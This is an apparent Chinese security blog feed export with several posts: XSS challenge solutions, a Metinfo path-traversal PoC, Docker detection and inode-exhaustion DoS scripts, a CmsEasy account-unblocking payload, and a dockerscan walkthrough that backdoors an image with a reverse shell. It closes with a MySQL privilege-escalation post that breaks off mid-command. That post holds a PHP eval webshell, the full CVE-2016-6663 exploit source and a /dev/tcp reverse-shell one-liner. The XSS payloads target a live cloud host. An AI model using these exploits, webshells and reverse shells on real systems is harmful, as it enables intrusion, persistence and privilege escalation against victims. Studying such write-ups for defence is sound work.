    <content type="text"><![CDATA[0x00 前言最近阿里先知论坛发起XSS挑战赛，记录一下自己做出的几道题的思路 0x01 题目及解答1.XSS-文件上传两个文件的源码如下xss1.php123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpheader("X-XSS-Protection: 0");$target_dir = "uploads/";$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);$uploadOk = 1;$imageFileType = pathinfo($target_file,PATHINFO_EXTENSION);// Check if image file is a actual image or fake imageif(isset($_POST["submit"])) &#123; $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]); if($check !== false) &#123; echo "File is an image - " . $check["mime"] . ".&lt;BR&gt;"; $uploadOk = 1; &#125; else &#123; echo "File is not an image."; $uploadOk = 0; &#125;&#125;// Check if file already existsif (file_exists($target_file)) &#123; echo "Sorry, file already exists."; $uploadOk = 0;&#125;// Check file sizeif ($_FILES["fileToUpload"]["size"] &gt; 500000) &#123; echo "Sorry, your file is too large."; $uploadOk = 0;&#125;// Allow certain file formatsif($imageFileType != "jpg" &amp;&amp; $imageFileType != "png" &amp;&amp; $imageFileType != "jpeg"&amp;&amp; $imageFileType != "gif" ) &#123; echo "Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed."; $uploadOk = 0;&#125;// Check if $uploadOk is set to 0 by an errorif ($uploadOk == 0) &#123; echo "Sorry, your file was not uploaded.";// if everything is ok, try to upload file&#125; else &#123; echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded."; &#125;?&gt; xss1.htm123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action="xss1.php" method="post" enctype="multipart/form-data"&gt; Select image to upload: &lt;input type="file" name="fileToUpload" id="fileToUpload"&gt; &lt;input type="submit" value="Upload Image" name="submit"&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 解题思路直接上传一个构造好文件名的图片即可触发xss，但是实际使用中不可能要求攻击对象自己上传图片并burp修改文件名，难点在如何构造一个POST包自动模拟上传文件，参考：从XSSer的角度测试上传文件功能，可以在IE浏览器下实现文件上传模拟，这里需要先上传正常图片burp抓包对比，然后构造对应的字段，而且不能再filename中出现字符/,最后构造poc文件如下：1234567&lt;html&gt;&lt;meta charset=utf-8&gt;&lt;form id="form" enctype="multipart/form-data" accept-charset="utf-8" action="http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss1.php" method="POST"&gt;&lt;textarea name='fileToUpload"; filename="&lt;svg onload=alert(document.domain);&gt;GIF89a1.jpg' Content-Type="image/jpeg"&gt;xss&lt;/textarea&gt;&lt;input type="submit" value="submit" /&gt;&lt;/form&gt;&lt;script&gt;document.getElementById('form').submit();&lt;/script&gt;&lt;/html&gt; 2.XSS-referrer和REQUEST_URI两个题的源码xss4.php1234567891011&lt;?phpheader("X-XSS-Protection: 0");?&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;/head&gt;&lt;body&gt;&lt;?php echo "你来自:".$_SERVER['HTTP_REFERER'];?&gt;&lt;/body&gt;&lt;/html&gt; xss13.php1234&lt;?phpheader("X-XSS-Protection: 0");echo "REQUEST_URI:".$_SERVER['REQUEST_URI'];?&gt; 解题思路直接返回请求的referer值或REQUEST_URI到页面上，所以可以插入执行XSS第一种解法：由于chrome和firefox浏览器以及win10版的IE浏览器均会把referer及REQUEST_URI采用URL编码，所以不能成功执行XSS脚本，但是可以在Win7操作系统下的IE浏览器上不会进行URL编码，可以利用如下脚本跳转触发XSS,12345&lt;html&gt;&lt;script&gt;window.location.href="http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss4.php";&lt;/script&gt;&lt;/html&gt; 请求url为：1http://localshot/xss4.html?&lt;script&gt;alert(document.domain)&lt;/script&gt; 第二种解法：利用flash跳转可以在Win10的IE下成功执行XSS,参考XSS via Referrer After Anniversary Update（1）利用navigateToURL跳转利用Adobe Flash Professional CS6工具，新建ActionScript文件命名xss_referrer.as，内容如下：1234567891011121314151617181920package &#123; import flash.display.Sprite; import flash.net.URLRequest; import flash.net.navigateToURL; public class xss_referrer extends Sprite&#123; public function xss_referrer() &#123; &#125; public function xss():String&#123; var url:URLRequest = new URLRequest("http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss4.php"); navigateToURL(url, "_self"); &#125; &#125;&#125;``` 保存，然后新建ActionScript 3.0（.fla）文件，xss_referrer.as保存在同一目录下，F9进入动作编程界面，输入内容如下：```javascriptvar xss:xss_referrer = new xss_referrer(); 接着导出为swf文件。请求url为（Win10下的IE成功执行脚本）： 1http://localshot/xss4.swf?&lt;script&gt;alert(document.domain)&lt;/script&gt; （2）利用getURL跳转利用Adobe Flash Professional CS6工具，新建ActionScript 2.0（.fla）文件，笔者测试如果选择ActionScript 3.0文件会提示没有getURL函数，输入内容如下： 1getURL("http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss4.php","","get") 同样需要导出为swf文件请求url为（Win10下的IE成功执行脚本）： 1http://localshot/xss4.swf?&lt;script&gt;alert(document.domain)&lt;/script&gt; 3.XSS-跳转源码文件xss5.php123456789101112131415&lt;?phpheader("X-XSS-Protection: 0");$url=str_replace(urldecode("%00"),"",$_GET["url"]);$url=str_replace(urldecode("%0d"),"",$url);$url=str_replace(urldecode("%0a"),"",$url);header("Location: ".$url);?&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;/head&gt;&lt;body&gt;&lt;?php echo "&lt;a href='".$url."'&gt;如果跳转失败请点我&lt;/a&gt;";?&gt;&lt;/body&gt;&lt;/html&gt; 解题思路开时想采用%00，%0a,%0d来阻止location跳转，参考Bottle HTTP 头注入漏洞探究，然而都过滤了，在朋友的指点下学习了不同解法(1)gopher协议1http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss5.php?url=gopher://123%27%20./a%3E%20%3Cscript%3Ealert(document.domain)%3C/script%3E (2)端口号（0、1、9、117等）1ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss5.php?url=https://www.baidu.com:0?'&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt; 4.XSS-强制下载源码文件xss6.php12345678910111213141516171819202122header("X-XSS-Protection: 0");header('Content-Disposition: attachment; filename="'.$_GET["filename"].'"');if(substr($_GET["url"],0,4) ==="http" &amp;&amp; substr($_GET["url"],0,8)&lt;&gt;"http://0" &amp;&amp; substr($_GET["url"],0,8)&lt;&gt;"http://1" &amp;&amp; substr($_GET["url"],0,8)&lt;&gt;"http://l" &amp;&amp; strpos($_GET["url"], '@') === false)&#123;$opts = array('http' =&gt; array( 'method' =&gt; 'GET', 'max_redirects' =&gt; '0', 'ignore_errors' =&gt; '1' ));$context = stream_context_create($opts);$url=str_replace("..","",$_GET["url"]);$stream = fopen($url, 'r', false, $context);echo stream_get_contents($stream);&#125;else&#123;echo "Bad URL!";&#125;?&gt; 解题思路%00 %0a %0d来阻止下载，返回目标问文件内容导致xss，xss6.txt的内容为1&lt;script&gt;alert(document.domain)&lt;/script&gt; 还有这里需要使用域名的方式绕过限制,请求URL如下：1http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss6.php?filename=%00&lt;11111111111111&gt;download&amp;url=http://xxxxxxxx.eu5.org/xss6.txt 5.XSS-HIDDEN源码文件xss14.php12345678910111213&lt;?phpheader('X-XSS-Protection:0');header('Content-Type:text/html;charset=utf-8');?&gt;&lt;head&gt;&lt;meta http-equiv="x-ua-compatible" content="IE=10"&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=''&gt;&lt;input type='hidden' name='token' value='&lt;?php echo htmlspecialchars($_GET['token']); ?&gt;'&gt;&lt;input type='submit'&gt;&lt;/body&gt; 解题思路参考当XSS遇到input hidden属性，利用accesskey在Firefox下成功执行,在Firefox下，使用ALT+SHIFT+X快捷键来触发XSS，请求URL如下：1http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss14.php?token=123' accesskey='X' onclick='alert(document.domain)'// 6.XSS-passive element源码文件xss17.php12345678&lt;?phpheader("Content-Type:text/html;charset=utf-8");header("X-Content-Type-Options: nosniff");header("X-FRAME-OPTIONS: DENY");header("X-XSS-Protection: 0");$content=$_GET["content"];echo "&lt;div data-content='".htmlspecialchars($content)."'&gt;";?&gt; 解题思路参考XSS without User Interaction from passive Elements，可以在除了Firefox下的浏览器上非交互直接执行XSS代码1http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss17.php?content=1' onfocus='alert(1)' contenteditable tabindex='0' id='xss 朋友也提到使用上一题的accesskey也可以，但是只能在Firefox下，使用ALT+SHIFT+X快捷键来触发XSS1http://ec2-13-58-146-2.us-east-2.compute.amazonaws.com/xss17.php?content=xss ' accesskey=X onclick=alert(1) id='xss 0x03小结此处XSS挑战学习了很多的新姿势，但是有不少情况存在一定的局限性，要求特定浏览器、特定版本、操作系统等。当然作为技术交流，这次的挑战赛很赞。]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Metinfo最新版5.3.17后台目录遍历Bypass]]></title>
    <url>%2F2017%2F07%2F20%2FMetinfo-directory-traversal-bypass%2F</url>
    <content type="text"><![CDATA[0x00前言CVE-2017-11500这个漏洞比较鸡肋，Metinfo最新版5.3.17后台某处目录遍历Bypass，可以删除任意zip文件。 0x02漏洞详情12345678# /admin/system/database/filedown.phpif($action=='delete')&#123; if(substr_count(trim($filenames),'../'))die('met2'); if(fileext($filenames)=='zip')&#123; @unlink('../../databack/'.$fileon.'/'.$filenames); &#125; metsave($rurls,'',$depth);&#125; 检测如果$filenames包含../则直接退出，但是这个很容易利用..\即可Bypass，然后检测文件的后缀名如果是zip就直接删除文件，所以存在目录遍历删除任意的zip文件。POC如下：1http://localhost/MetInfo5.3/admin/system/database/filedown.php?anyid=13&amp;action=delete&amp;filenames=..\..\..\..\..\..\..\..\..\..\..\..\..\..\test.zip&amp;fileon=web&amp;lang=cn 0x02小结/admin/system/database/filedown.php文件的$filenames参数存在目录遍历删除任意的zip文件，此处没有CSRF防护，可以结合CSRF漏洞利用。]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker检测技术研究]]></title>
    <url>%2F2017%2F07%2F11%2Fdocker-detection-technology%2F</url>
    <content type="text"><![CDATA[0x00前言随着Docker的广泛应用，获取一个云端服务器的控制权限之后，检测目标是一个真实机器还是在Docker容器环境中变得越来越重要 0x01Docker检测Docker基于Linux的LXC提供虚拟化服务，为了对不同Docker容器（Container）进行有效的控制，需要在容器内初始化一些配置文件，因此，可以通过检测这类的配置文件检测是Docker容器内部还是在真实机器。 基于/proc/self/cgroup内容是否包含”docker”的检测(左边Docker容器环境，右边真机环境) 基于/proc/self/cpuset内容是否包含”docker”的检测(左边Docker容器环境，右边真机环境) 基于是否包含存在”/.dockerenv”的检测(左边Docker容器环境，右边真机环境) 0x02检测脚本先看看检测效果(左边Docker容器环境，右边真机环境) 源码如下，为了突出检测结果，增加了字体颜色修改1234567891011121314151617#!/bin/bashisDocker()&#123;if [ $(cat /proc/self/cgroup|grep -c "docker") -gt 1 ];then echo -e "\033[31mThis is a Docker container\033[0m"; elif [ $(cat /proc/self/cpuset|grep -c "docker") -gt 1 ];then echo -e "\033[31mThis is a Docker container\033[0m"; elif [ -f "/.dockerenv" ];then echo -e "\033[31mThis is a Docker container\033[0m";else echo -e "\033[34mThis is not a Docker container\033[0m";fi &#125;isDocker 使用方法1wget http://blackwolfsec.cc/static/code/isDocker.sh -O isDocker.sh &amp;&amp; chmod +x isDocker.sh&amp;&amp; ./isDocker.sh 如果不喜欢上面下载bash脚本的方式，也可以直接复制下面的命令到shell下执行检测1if [[ $(cat /proc/self/cgroup|grep -c "docker") -gt 1 || $(cat /proc/self/cpuset|grep -c "docker") -gt 1 || -f "/.dockerenv" ]];then echo -e "\033[31mThis is a Docker container\033[0m";else echo -e "\033[34mThis is not a Docker container\033[0m";fi 0x03参考链接 http://tuhrig.de/how-to-know-you-are-inside-a-docker-container/ https://github.com/sindresorhus/is-docker/blob/master/index.js https://forums.docker.com/t/how-can-a-process-detect-if-it-is-running-in-a-container/11123 https://github.com/pipedrive/containerized]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker拒绝服务攻击之Inode]]></title>
    <url>%2F2017%2F07%2F06%2Fdocker-dos-attack-inode%2F</url>
    <content type="text"><![CDATA[0x00前言Docker在各领域的应用越来越广泛，最近在分析Docker安全的相关内容，分享一个由于Inode导致的Docker拒绝服务攻击。 0x01Inode简介及Docker安全1.Inode负责Linux文件系统中存储文件的信息，包括文件名、创建日期等，更加详细的介绍参考理解inode，这里我们只关注在Linux文件系统中，每个文件需要有对应的Inode，而且Inode是一种有限的资源（类比：端口号只有65535个），如果Inode被使用完毕，即使磁盘还有剩余空间也无法建立新的文件，导致需要新建文件的服务无法正常运行。 2.众所周知，Docker利用Linux内核的Namespace、Capability、CGroup以及SELinux等提供系统层面的虚拟化服务，提供相比于传统的虚拟机（VM）技术更加轻量级的隔离容器（Container）服务。然而正由于多个容器共用一个底层操作系统，有些隔离措施的缺陷会导致Docker存在一定的安全风险。如果在一个容器内不断创建新的文件，就会把宿主机（真实主机）的文件系统的Inode消耗完毕，导致其他容器无法新建文件，导致服务异常，而且宿主机也不能新建其他容器，导致拒绝服务攻击。 0x02实践过程测试环境： Docker version 17.03.1-ce Ubuntu 16.04 20G SSD腾讯云主机 利用Docker run -it tutum/lamp /bin/bash启动容器，并获取bash命令shell新建bash文件，实现循环新建空文件，消耗Inode资源，详细内容如下：1234567#!/bin/bashi=1while truedo i=$(($i+1)); touch $i;done 运行脚本等待一段时间，提示No space left on device 此时在宿主机上用df -i命令查看Inode使用100%，于是所有的Inode资源被消耗完 如果尝试新建容器的失败，提示no space left on device 0x03小结Docker的不同容器共享同一个宿主机，虽然Docker有很多的安全隔离机制，但是有些资源的隔离存在缺陷。如果其中一个容器消耗完Inode资源会导致其他容器需要新建文件的所有功能异常，也会导致宿主机的功能异常，达到针对其他容器和宿主机的拒绝服务攻击。]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CmsEasy会员编辑资料安全性分析]]></title>
    <url>%2F2017%2F06%2F01%2Fcmseasy-security-1%2F</url>
    <content type="text"><![CDATA[0x00前言最近一段时间尝试研究CmsEasy的安全性，分析了一下“会员编辑资料”功能的小问题。 0x01会员编辑资料安全分析ps:front::$post进行了一些XSS、SQL等过滤，另外还有360Web防火墙，所以此处不关注这些漏洞，关注逻辑问题会员中心-&gt;编辑资料123456789101112131415161718192021222324252627//D:\wamp64\www\cmseasy_5.6\lib\default\user_act.phpfunction edit_action()&#123; if (front::post('submit')) &#123; unset(front::$post['username']); unset(front::$post['groupid']); unset(front::$post['powerlist']); unset(front::$post['password']); if (!is_email(front::$post['e_mail'])) &#123; alerterror(lang('mailbox_format_is_not')); &#125; foreach (front::$post as $k =&gt; $v) &#123; if (is_array($v) &amp;&amp; !empty($v)) &#123; front::$post[$k] = implode(',', $v); &#125; front::check_type(front::post($k), 'safe'); &#125; $this-&gt;_user-&gt;rec_update(front::$post, "username='".session::get('username')."'"); //var_dump(front::$post); front::flash(lang('modify_data_successfully')); front::redirect(url::create('user/index')); &#125; $this-&gt;view-&gt;data = $this-&gt;view-&gt;user; //var_dump($this-&gt;view-&gt;data);&#125; edit_action函数删除POST数据包中的username、groupid、powerlist、password字段，接着遍历POST数据，检测安全性，赋值后，调用$this-&gt;_user-&gt;rec_update更新数据库（这里考虑到PHP unset区分大小写，而Mysql不区分大小写，起初认为通过大小写绕过groupid的unset，直接提权为管理员，然而事与愿违……）123456function rec_update($row,$where) &#123; $tbname=$this-&gt;name; $sql=$this-&gt;sql_update($tbname,$row,$where); //echo $sql."&lt;br&gt;";exit; return $this-&gt;query_unbuffered($sql);&#125; rec_update函数调用sql_update函数12345678910111213141516171819202122232425//D:\wamp64\www\cmseasy_5.6\lib\inc\table.phpfunction sql_update($tbname,$row,$where) &#123; //var_dump($row); $sqlud=''; if (is_string($row)) $sqlud = $row.' '; else foreach ($row as $key=&gt;$value) &#123; if (in_array($key,explode(',',$this-&gt;getcolslist()))) &#123; $value=$value; /*if (preg_match('/^\[(.*)\]$/',$value,$match)) $sqlud .= "`$key`"."= '".$match[1]."',"; else*/if ($value === "") $sqlud .= "`$key`= NULL, "; else $sqlud .= "`$key`"."= '".$value."',"; &#125; &#125; $sqlud=rtrim($sqlud); $sqlud=rtrim($sqlud,','); $this-&gt;condition($where); $sql="UPDATE `".$tbname."` SET ".$sqlud." WHERE ".$where; //echo $sql; return $sql;&#125; sql_update函数调用$this-&gt;getcolslist()返回数据库中表的列名，接着用in_array判断字段名$key是否包含于数据库表的列名数组之内，如果不在数组之内直接忽略该字段。（in_array区分大小写，所以即使绕过了unset函数，也不能成功update数据库的username、groupid、powerlist、password字段）不能提权利用，但是由于遍历POST数据后update操作，存在其他的安全问题，可以修改数据库中原本没有权限直接修改的数据，比如：isblock、isdelete、checked、userip等例如：管理员在后台“冻结”并”清退”了test用户，该用户登录后修改资料，POST添加isblock=0&amp;isdelete=0数据包即可解除“冻结”和”清退”状态，payload如下:1username=test&amp;nickname=123&amp;question=&amp;isblock=0&amp;isdelete=0&amp;answer=&amp;qq=1111111111&amp;e_mail=test%40test.com&amp;tel=18702111&amp;address=123123&amp;intro=123123&amp;submit=%E6%8F%90%E4%BA%A4]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一款Docker攻击工具dockerscan]]></title>
    <url>%2F2017%2F05%2F27%2Fdocker-security%2F</url>
    <content type="text"><![CDATA[0x00前言最近关注Docker安全，发现一个Docker security analysis &amp; hacking tools-dockerscan 0x01简单实践1.下载tutum/lamp1docker pull tutum/lamp 2.导出docker镜像为文件1docker save tutum/lamp -o tutum_lamp 3.简单分析123456789101112131415161718192021# 输入命令dockerscan image info tutum_lamp # 输出结果如下[ * ] Starting analyzing docker image...[ * ] Selected image: 'tutum_lamp'[ * ] Analysis finished. Results:[ * ] - Docker version = 1.9.1[ * ] - Created date = 2016-02-15T10:35:01.761164611Z[ * ] - Host name = dfc2eabdf236[ * ] - Exposed ports:[ * ] &gt; 3306:[ * ] + tcp[ * ] &gt; 80:[ * ] + tcp[ * ] - Author = Fernando Mayo , Feng Honglin [ * ] - Cmd = /run.sh[ * ] - Environment:[ * ] &gt; PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin[ * ] &gt; DEBIAN_FRONTEND=noninteractive[ * ] &gt; PHP_UPLOAD_MAX_FILESIZE=10M[ * ] &gt; PHP_POST_MAX_SIZE=10M 4.修改镜像，添加trojanize反弹shell12345678910# 输入命令dockerscan image modify trojanize -l 192.168.1.100 -p 8888 tutum_lamp -o tutum_lamp_modify_trojanize# 输出结果如下[ * ] Starting analyzing docker image...[ * ] Selected image: 'tutum_lamp'[ * ] Image troyanized successful[ * ] Trojanized image location:[ * ] &gt; /home/ubuntu/dockerscan/tutum_lamp_modify_trojanize.tar[ * ] To receive the reverse shell, only write:[ * ] &gt; nc -v -k -l 192.168.1.100 8888 5.导入新的镜像并运行123# 输入命令docker load -i tutum_lamp_modify_trojanize.tardocker run -d tutum/lamp 5.控制端监听,获取权限，执行命令12345678910111213141516171819202122232425262728293031# 输入命令ubuntu@VM-234-6-ubuntu:~$ nc -lvk 8888# 输出结果如下Listening on [0.0.0.0] (family 0, port 8888)Connection from [192.168.1.100] port 8888 [tcp/*] accepted (family 2, sport 48152)connecting peoplelsappbinbootcreate_mysql_admin_user.shdevetchomeliblib64mediamntoptprocrootrunrun.shsbinsrvstart-apache2.shstart-mysqld.shsystmpusrvar 6.再次分析添加trojanize反弹shell后的镜像信息1234567891011121314151617181920212223dockerscan image info tutum_lamp_modify_trojanize.tar # 输出结果如下[ * ] Starting analyzing docker image...[ * ] Selected image: 'tutum_lamp_modify_trojanize.tar'[ * ] Analysis finished. Results:[ * ] - Created date = 2016-02-15T10:35:01.761164611Z[ * ] - Author = Fernando Mayo , Feng Honglin [ * ] - Cmd = /run.sh[ * ] - Docker version = 1.9.1[ * ] - Host name = dfc2eabdf236[ * ] - Environment:[ * ] &gt; PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin[ * ] &gt; DEBIAN_FRONTEND=noninteractive[ * ] &gt; PHP_UPLOAD_MAX_FILESIZE=10M[ * ] &gt; PHP_POST_MAX_SIZE=10M[ * ] &gt; REMOTE_ADDR=192.168.1.100[ * ] &gt; REMOTE_PORT=8888[ * ] &gt; LD_PRELOAD=/usr/share/lib/reverse_shell.so[ * ] - Exposed ports:[ * ] &gt; 80:[ * ] + tcp[ * ] &gt; 3306:[ * ] + tcp 0x02原理小结1.修改镜像内容copy reverse_shell.so文件到/usr/share/lib/reverse_shell.so，2.添加环境变量REMOTE_ADDR=192.168.1.100，REMOTE_PORT=8888，LD_PRELOAD=/usr/share/lib/reverse_shell.so3.利用LD_PRELOAD预先加载在每次允许docker镜像时反弹shell回来。]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql提权]]></title>
    <url>%2F2017%2F05%2F19%2FMysql_Privilege_Escalation%2F</url>
    <content type="text"><![CDATA[0x00前言Mysql之前爆出了CVE-2016-6662、CVE-2016-6663、CVE-2016-6664提权漏洞，影响了Mysql小于5.5.51或小于5.6.32或小于5.7.14及衍生版本。然而好多网站都没有升级，利用场景还是很多的，于是实践一下。 0x01环境搭建1.采用tutum/lamp的docker作为测试系统环境1234567# docker运行及必要环境配置docker run -d -P tutum/lampdocker exec -it &lt;container_id&gt; /bin/bashapt update &amp;&amp; apt install -y wget gcc libmysqlclient-dev# webshell写入echo "&lt;?php @eval(\$_POST[1]);?&gt;" &gt; /var/www/html/shell.phpchmod -R 777 /var/www/html 2.数据库配置123456# 添加用户test,密码123456,授予权限create,drop,insert,selectmysqlcreate database testdb;CREATE USER 'test'@'%' IDENTIFIED BY '123456'; grant create,drop,insert,select on testdb.* to 'test'@'%';flush privileges; 0x02 www-data权限提升为mysql权限利用CVE-2016-66631.菜刀链接webshell，然后上传需要用到的mysql-privesc-race.c文件，内容如下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238#include &lt;fcntl.h&gt;#include &lt;grp.h&gt;#include &lt;mysql.h&gt;#include &lt;pwd.h&gt;#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/inotify.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;time.h&gt;#include &lt;unistd.h&gt;#define EXP_PATH "/tmp/mysql_privesc_exploit"#define EXP_DIRN "mysql_privesc_exploit"#define MYSQL_TAB_FILE EXP_PATH "/exploit_table.MYD"#define MYSQL_TEMP_FILE EXP_PATH "/exploit_table.TMD"#define SUID_SHELL EXP_PATH "/mysql_suid_shell.MYD"#define MAX_DELAY 1000 // can be used in the race to adjust the timing if necessaryMYSQL *conn; // DB handlesMYSQL_RES *res;MYSQL_ROW row;unsigned long cnt;void intro() &#123;printf( "\033[94m\n" "MySQL/Percona/MariaDB - Privilege Escalation / Race Condition PoC Exploit\n" "mysql-privesc-race.c (ver. 1.0)\n\n" "CVE-2016-6663 / CVE-2016-5616\n\n" "For testing purposes only. Do no harm.\n\n" "Discovered/Coded by:\n\n" "Dawid Golunski \n" "http://legalhackers.com" "\033[0m\n\n");&#125;void usage(char *argv0) &#123; intro(); printf("Usage:\n\n%s user pass db_host database\n\n", argv0);&#125;void mysql_cmd(char *sql_cmd, int silent) &#123; if (!silent) &#123; printf("%s \n", sql_cmd); &#125; if (mysql_query(conn, sql_cmd)) &#123; fprintf(stderr, "%s\n", mysql_error(conn)); exit(1); &#125; res = mysql_store_result(conn); if (res&gt;0) mysql_free_result(res);&#125;int main(int argc,char **argv)&#123; int randomnum = 0; int io_notified = 0; int myd_handle; int wpid; int is_shell_suid=0; pid_t pid; int status; struct stat st; /* io notify */ int fd; int ret; char buf[4096] __attribute__((aligned(8))); int num_read; struct inotify_event *event; /* credentials */ char *user = argv[1]; char *password = argv[2]; char *db_host = argv[3]; char *database = argv[4]; // Disable buffering of stdout setvbuf(stdout, NULL, _IONBF, 0); // Get the params if (argc!=5) &#123; usage(argv[0]); exit(1); &#125; intro(); // Show initial privileges printf("\n[+] Starting the exploit as: \n"); system("id"); // Connect to the database server with provided credentials printf("\n[+] Connecting to the database `%s` as %s@%s\n", database, user, db_host); conn = mysql_init(NULL); if (!mysql_real_connect(conn, db_host, user, password, database, 0, NULL, 0)) &#123; fprintf(stderr, "%s\n", mysql_error(conn)); exit(1); &#125; // Prepare tmp dir printf("\n[+] Creating exploit temp directory %s\n", "/tmp/" EXP_DIRN); umask(000); system("rm -rf /tmp/" EXP_DIRN " &amp;&amp; mkdir /tmp/" EXP_DIRN); system("chmod g+s /tmp/" EXP_DIRN ); // Prepare exploit tables :) printf("\n[+] Creating mysql tables \n\n"); mysql_cmd("DROP TABLE IF EXISTS exploit_table", 0); mysql_cmd("DROP TABLE IF EXISTS mysql_suid_shell", 0); mysql_cmd("CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '" EXP_PATH "'", 0); mysql_cmd("CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = 'MyISAM' data directory '" EXP_PATH "'", 0); // Copy /bin/bash into the mysql_suid_shell.MYD mysql table file // The file should be owned by mysql:attacker thanks to the sticky bit on the table directory printf("\n[+] Copying bash into the mysql_suid_shell table.\n After the exploitation the following file/table will be assigned SUID and executable bits : \n"); system("cp /bin/bash " SUID_SHELL); system("ls -l " SUID_SHELL); // Use inotify to get the timing right fd = inotify_init(); if (fd &lt; 0) &#123; printf("failed to inotify_init\n"); return -1; &#125; ret = inotify_add_watch(fd, EXP_PATH, IN_CREATE | IN_CLOSE); /* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */ printf("\n[+] Entering the race loop... Hang in there...\n"); while ( is_shell_suid != 1 ) &#123; cnt++; if ( (cnt % 100) == 0 ) &#123; printf("-&gt;"); //fflush(stdout); &#125; /* Create empty file , remove if already exists */ unlink(MYSQL_TEMP_FILE); unlink(MYSQL_TAB_FILE); mysql_cmd("DROP TABLE IF EXISTS exploit_table", 1); mysql_cmd("CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '" EXP_PATH "'", 1); /* random num if needed */ srand ( time(NULL) ); randomnum = ( rand() % MAX_DELAY ); // Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink pid = fork(); if (pid &lt; 0) &#123; fprintf(stderr, "Fork failed :(\n"); &#125; /* Child process - executes REPAIR TABLE SQL statement */ if (pid == 0) &#123; usleep(500); unlink(MYSQL_TEMP_FILE); mysql_cmd("REPAIR TABLE exploit_table EXTENDED", 1); // child stops here exit(0); &#125; /* Parent process - aims to replace the temp .tmd table with a symlink before chmod */ if (pid &gt; 0 ) &#123; io_notified = 0; while (1) &#123; int processed = 0; ret = read(fd, buf, sizeof(buf)); if (ret &lt; 0) &#123; break; &#125; while (processed &lt; ret) &#123; event = (struct inotify_event *)(buf + processed); if (event-&gt;mask &amp; IN_CLOSE) &#123; if (!strcmp(event-&gt;name, "exploit_table.TMD")) &#123; //usleep(randomnum); // Set the .MYD permissions to suid+exec before they get copied to the .TMD file unlink(MYSQL_TAB_FILE); myd_handle = open(MYSQL_TAB_FILE, O_CREAT, 0777); close(myd_handle); chmod(MYSQL_TAB_FILE, 04777); // Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec unlink(MYSQL_TEMP_FILE); symlink(SUID_SHELL, MYSQL_TEMP_FILE); io_notified=1; &#125; &#125; processed += sizeof(struct inotify_event); &#125; if (io_notified) &#123; break; &#125; &#125; waitpid(pid, &amp;status, 0); &#125; // Check if SUID bit was set at the end of this attempt if ( lstat(SUID_SHELL, &amp;st) == 0 ) &#123; if (st.st_mode &amp; S_ISUID) &#123; is_shell_suid = 1; &#125; &#125; &#125; printf("\n\n[+] \033[94mBingo! Race won (took %lu tries) !\033[0m Check out the \033[94mmysql SUID shell\033[0m: \n\n", cnt); system("ls -l " SUID_SHELL); printf("\n[+] Spawning the \033[94mmysql SUID shell\033[0m now... \n Remember that from there you can gain \033[1;31mroot\033[0m with vuln \033[1;31mCVE-2016-6662\033[0m or \033[1;31mCVE-2016-6664\033[0m :)\n\n"); system(SUID_SHELL " -p -i "); //system(SUID_SHELL " -p -c '/bin/bash -i -p'"); /* close MySQL connection and exit */ printf("\n[+] Job done. Exiting\n\n"); mysql_close(conn); return 0;&#125; 2.反弹shell1/bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/9999 0&gt;&amp;1 3.反弹shell的监听端，执行如下指令123cd /var/www/html/gcc 